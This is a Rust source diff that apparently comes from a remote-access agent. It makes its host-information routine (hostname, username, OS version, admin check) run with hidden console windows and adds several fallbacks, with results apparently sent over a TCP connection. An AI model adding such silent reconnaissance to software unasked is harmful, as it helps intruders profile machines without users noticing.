@@ -230,36 +230,114 @@ fn send_sysinfo(writer: &mut TcpStream) -> bool {
 }
 
 fn get_system_info(info_type: &str) -> String {
+    #[cfg(target_os = "windows")]
+    use std::os::windows::process::CommandExt;
+    
     let output = match info_type {
-        "hostname" => Command::new("hostname").output(),
-        "username" => Command::new("cmd").args(&["/C", "echo %USERNAME%"]).output(),
+        "hostname" => {
+            #[cfg(target_os = "windows")]
+            {
+                Command::new("hostname")
+                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                    .output()
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                Command::new("hostname").output()
+            }
+        },
+        "username" => {
+            #[cfg(target_os = "windows")]
+            {
+                Command::new("cmd")
+                    .args(&["/C", "echo %USERNAME%"])
+                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                    .output()
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                Command::new("whoami").output()
+            }
+        },
         "os" => {
-            // Get Windows version from registry for accurate Win10/11 detection
-            let output = Command::new("cmd")
-            .args(&["/C", r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName"#])
-            .output();
-            
-            // Parse the registry output to extract just the OS name
-            match output {
-                Ok(out) => {
+            #[cfg(target_os = "windows")]
+            {
+                // Método 1: Intentar leer desde el registro (más preciso)
+                let registry_output = Command::new("cmd")
+                    .args(&["/C", r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName"#])
+                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                    .output();
+                
+                if let Ok(out) = registry_output {
                     let full_output = String::from_utf8_lossy(&out.stdout);
-                    // Find the line with "ProductName" and extract the value after "REG_SZ"
                     for line in full_output.lines() {
                         if line.contains("ProductName") && line.contains("REG_SZ") {
                             if let Some(os_name) = line.split("REG_SZ").nth(1) {
-                                return os_name.trim().to_string(); // Return early with cleaned output
+                                let trimmed = os_name.trim().to_string();
+                                if !trimmed.is_empty() {
+                                    return trimmed;
+                                }
                             }
                         }
                     }
-                    // If parsing failed, return the raw output
-                    return String::from_utf8_lossy(&out.stdout).trim().to_string();
                 }
-                Err(_) => return "Unknown".to_string(),
+                
+                // Método 2: Fallback con wmic (más compatible pero más lento)
+                let wmic_output = Command::new("wmic")
+                    .args(&["os", "get", "Caption", "/value"])
+                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                    .output();
+                
+                if let Ok(out) = wmic_output {
+                    let full_output = String::from_utf8_lossy(&out.stdout);
+                    for line in full_output.lines() {
+                        if line.starts_with("Caption=") {
+                            let os_name = line.strip_prefix("Caption=").unwrap_or("").trim();
+                            if !os_name.is_empty() {
+                                return os_name.to_string();
+                            }
+                        }
+                    }
+                }
+                
+                // Método 3: Último fallback con systeminfo (más lento)
+                let systeminfo_output = Command::new("cmd")
+                    .args(&["/C", "systeminfo | findstr /B /C:\"OS Name\""])
+                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                    .output();
+                
+                if let Ok(out) = systeminfo_output {
+                    let full_output = String::from_utf8_lossy(&out.stdout);
+                    if let Some(line) = full_output.lines().next() {
+                        if let Some(os_name) = line.split(':').nth(1) {
+                            let trimmed = os_name.trim().to_string();
+                            if !trimmed.is_empty() {
+                                return trimmed;
+                            }
+                        }
+                    }
+                }
+                
+                return "Windows (version unknown)".to_string();
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                Command::new("uname").args(&["-s", "-r"]).output()
             }
         },
-        "privileges" => Command::new("cmd")
-            .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
-            .output(),
+        "privileges" => {
+            #[cfg(target_os = "windows")]
+            {
+                Command::new("cmd")
+                    .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
+                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                    .output()
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                Command::new("id").args(&["-u"]).output()
+            }
+        },
         _ => return String::new(),
     };
 
